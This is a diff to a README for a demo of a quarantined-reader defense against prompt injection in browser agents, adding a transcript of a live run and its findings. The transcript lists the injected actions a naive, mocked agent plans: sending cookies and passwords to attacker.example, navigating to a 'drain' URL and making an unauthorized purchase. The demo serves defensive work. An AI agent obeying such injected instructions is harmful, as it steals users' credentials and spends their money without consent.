@@ -83,11 +83,50 @@ npm start
 
 Requires Node 18+ (uses top-level `await`). `npm start` runs `tsx index.ts`.
 
+## ✅ Validated against the live API — 2026-09-02
+
+Run with a real `slr_live_` key on the starter plan. **Works end-to-end**, no
+code changes needed. Actual transcript:
+
+```
+=== NAIVE SINGLE-AGENT BASELINE (vulnerable) ===
+planned actions:
+   - EXPORT_COOKIES -> https://attacker.example/collect
+   - NAVIGATE -> https://attacker.example/drain
+   - EXFIL_PASSWORDS -> attacker
+   - PURCHASE x999 (unauthorized)
+   - REPORT_PRICE
+
+=== QUARANTINED READER (disposable, no profile/credentials) ===
+extracted     : name="SuperWidget 3000" price=49.99
+reader        : session killed (blast radius discarded)
+
+=== TRUST BOUNDARY ===
+validated     : {"productName":"SuperWidget 3000","priceUsd":49.99}  (prose rejected)
+
+=== PRIVILEGED ACTOR (real profile, sanitized input only) ===
+action        : record "SuperWidget 3000" @ $49.99 in logged-in dashboard
+actor         : never received the injection — it was never in scope
+```
+
+### Findings from the live run
+
+- **The boundary holds:** the naive agent obeys all five injected actions; the
+  quarantine reader returns only `{productName, priceUsd}`, and the privileged
+  actor acts on that alone — the injection was never in its session.
+- **All browser SDK methods work as documented** (`launch()`,
+  `launch({ profileId })`, Playwright `page` API, `browser.close()`,
+  `solari.close()`, `profiles.list/create/delete`).
+- **Concurrency:** sessions run one at a time (reader closed before actor), so it
+  fits the starter plan's concurrent-session limit.
+- **Cleanup:** the demo creates a persistent profile (`quarantine-demo-privileged`)
+  and does **not** delete it — delete it afterward with `profiles.delete(id)`
+  (verified). Note `solari.sessions` has **no `list()`** method, so lingering
+  browser sessions can't be enumerated via the SDK; rely on `close()`. Account
+  verified back to 0 profiles/sessions after cleanup.
+
 ## Status / limitations
 
-- **Not run against the live Solari API.** The code is written to the confirmed
-  SDK surface (cookbook + docs.getsolari.com) but has not been executed with a
-  real key.
 - **The LLM is mocked.** `mockLlmPlanner` is a deterministic stand-in that
   surfaces instructions found in its input, to make the naive-vs-quarantine
   contrast concrete and reproducible. A real model would be the thing getting
